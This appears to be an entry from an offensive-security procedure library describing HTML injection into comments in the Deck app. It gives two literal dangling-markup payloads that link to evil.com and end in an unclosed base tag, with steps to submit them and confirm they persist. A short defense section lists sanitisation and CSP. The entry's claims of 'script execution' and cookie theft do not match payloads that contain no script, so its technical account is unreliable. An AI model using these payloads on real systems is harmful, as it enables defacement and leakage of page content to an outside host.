---
id: proc-inject-html-payload-comments
tags:
  - xss
  - html-injection
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.458Z'
skill_level: beginner
impact_level: low
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-HTML-Payload-in-Comments

## Summary

This procedure injects malicious HTML into Deck card comments to exploit the self-XSS vulnerability, using payloads that override base targets and include styled links for script execution.

## Description

The Deck app's comment system fails to sanitize HTML inputs adequately, allowing tags like <a>, <font>, and <base> to be injected. Payloads are crafted to create dangling markup that can lead to script execution upon rendering. This affects only the viewer's session, enabling potential self-targeted attacks like cookie theft if escalated.

## Requirements

1. Access to a Deck card's comments section
2. Knowledge of target external domain for payload (e.g., evil.com)
3. Web browser developer tools for payload testing

## Defense

Defensive measures and detection strategies:

- Sanitize all HTML inputs server-side using libraries like DOMPurify
- Implement content security policies (CSP) to block inline scripts
- Monitor comment submissions for suspicious HTML patterns

## Objectives

1. Bypass input validation with HTML tags
2. Create executable markup in comments
3. Set up for one-time self-execution

## Instructions

### Step 1: Prepare Primary Payload

**Context**: Craft the initial HTML injection string.

In the comments input, enter: `<a href="http://evil.com/dangling_markup/name.html"><font size=100 color=red>You must click me</font></a><base target="`.

**Expected Output**: Text accepted without stripping.

### Step 2: Test Alternative Payload

**Context**: Use a variation to confirm injection consistency.

Enter alternative: `<a href="http://evil.com/dangling_markup/name2.html"><font size=100 color=blue>You Hacked by BhaRat</font></a><base target="`.

**Expected Output**: Similar acceptance and rendering potential.

### Step 3: Validate Input

**Context**: Ensure no client-side blocking.

Preview or submit partially to check if HTML persists.

**Expected Output**: Raw HTML visible in source upon inspection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[html-injection]]
- [[payload]]
